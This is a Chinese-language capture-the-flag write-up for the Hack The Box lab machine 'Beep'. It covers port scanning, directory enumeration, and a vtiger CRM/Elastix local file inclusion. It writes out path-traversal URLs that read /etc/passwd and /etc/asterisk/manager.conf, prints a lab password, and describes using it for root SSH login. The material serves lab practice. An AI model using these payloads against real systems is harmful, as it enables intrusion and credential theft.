# Beep

- **Beep是hackthebox的一台简单的靶机**

- 首先使用nmap查看端口的开放情况和漏洞

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sV -A 10.10.10.7                                              130 ⨯
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-13 05:10 EDT
Nmap scan report for 10.10.10.7
Host is up (0.27s latency).
Not shown: 987 closed ports
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
25/tcp    open  smtp       Postfix smtpd
|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
80/tcp    open  http       Apache httpd 2.2.3
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Did not follow redirect to https://10.10.10.7/
110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_pop3-capabilities: RESP-CODES TOP UIDL STLS USER APOP LOGIN-DELAY(0) IMPLEMENTATION(Cyrus POP3 server v2) AUTH-RESP-CODE EXPIRE(NEVER) PIPELINING
111/tcp   open  rpcbind    2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            877/udp   status
|_  100024  1            880/tcp   status
143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_imap-capabilities: SORT=MODSEQ UNSELECT STARTTLS X-NETSCAPE THREAD=ORDEREDSUBJECT IMAP4rev1 ANNOTATEMORE LIST-SUBSCRIBED THREAD=REFERENCES NO RENAME UIDPLUS ACL OK RIGHTS=kxte LISTEXT IDLE SORT MAILBOX-REFERRALS Completed IMAP4 BINARY CONDSTORE CATENATE ATOMIC ID MULTIAPPEND QUOTA CHILDREN LITERAL+ URLAUTHA0001 NAMESPACE
443/tcp   open  ssl/https?
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2017-04-07T08:22:08
|_Not valid after:  2018-04-07T08:22:08
|_ssl-date: 2021-10-13T09:13:57+00:00; +1s from scanner time.
880/tcp   open  status     1 (RPC #100024)
993/tcp   open  ssl/imap   Cyrus imapd
|_imap-capabilities: CAPABILITY
995/tcp   open  pop3       Cyrus pop3d
3306/tcp  open  mysql      MySQL (unauthorized)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
4445/tcp  open  upnotifyp?
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
.
```

- 浏览器打开https://10.10.10.7

![image-20211013195748932](http://cdn.mxrblog.cn/image-20211013195748932.png)

- dirsearch扫描靶机的80端口,http://10.10.10.7，尝试了一遍，没有什么有价值的东西

![image-20211013195614708](http://cdn.mxrblog.cn/image-20211013195614708.png)

- gobuster扫描一下443端口下的：https://10.10.10.7

![image-20211013195926332](http://cdn.mxrblog.cn/image-20211013195926332.png)

- 分别用浏览器查看这几个目录
- /admin

![image-20211013200433818](http://cdn.mxrblog.cn/image-20211013200433818.png)

- /configs

![image-20211013200524407](http://cdn.mxrblog.cn/image-20211013200524407.png)

- /vtigercrm

![image-20211013200621752](http://cdn.mxrblog.cn/image-20211013200621752.png)

- 当浏览到/vtigercrm目录时，我发现页面右下角显示了一个版本序列号



![image-20211013200728994](http://cdn.mxrblog.cn/image-20211013200728994.png)

- 使用searchsploit vtiger CRM 5.1.0 查看是否存在漏洞

![image-20211013200841109](http://cdn.mxrblog.cn/image-20211013200841109.png)

- 查看漏洞文件都说了些什么
- 提示说有LFI （文件包含漏洞）

![image-20211013201003369](http://cdn.mxrblog.cn/image-20211013201003369.png)

- 在浏览器中打开上面说的地址

```
https://1/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../../etc/passwd%00
```

### 解法一

- 由于上面的过程最后会有不同的解法，再次给出多种答案：
- 打开10.10.10.7页面（之前打开过），会发现一个名为elastix的引擎软件，使用searchsploit查看是否有漏洞
- ![image-20211014000459211](http://cdn.mxrblog.cn/image-20211014000459211.png)

- 使用上面显示的LFI漏洞

![image-20211014001221868](http://cdn.mxrblog.cn/image-20211014001221868.png)

- 使用浏览器查看

![image-20211014001919589](http://cdn.mxrblog.cn/image-20211014001919589.png)

- 发现用户名与密码

```
admin
jEhdIekWmdjE
```

- 使用ssh尝试连接

![image-20211014002859642](http://cdn.mxrblog.cn/image-20211014002859642.png)

- 登不上，百度后找到了解决的办法

![image-20211014003304538](http://cdn.mxrblog.cn/image-20211014003304538.png)

- 开始尝试登录
- 第一次使用用户名为admin登录发现无法登录用户名不匹配
- 第二次将用户名改为root用户，然后成功
- 总结：多尝试，多百度，胆要肥

![image-20211014003809769](http://cdn.mxrblog.cn/image-20211014003809769.png)

- 获得root.txt和user.txt

![image-20211014004036947](http://cdn.mxrblog.cn/image-20211014004036947.png)



### 解法二

- **[参考链接](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-beep/)**

- 第一种解法有点意外，毕竟这个密码我们是得到了，但是却无法猜到是root用户的密码，这样我们就拿不到flag

I also do some research on **default credentials** for vTiger and find some documentation around installing **vTiger Asterisk Connector**

![img](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-01-at-20.44.49.png)https://www.vtiger.com/docs/asterisk-integration

If we modify the previous URL to

```url
https://10.10.10.7/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../../etc/asterisk/manager.conf%00
```

I navigate to this page (using source code to prettify the output)

![img](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-03-at-00.55.05.png)https://10.10.10.7/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../../etc/asterisk/manager.conf%00

I find a password **jEhdIekWmdjE**
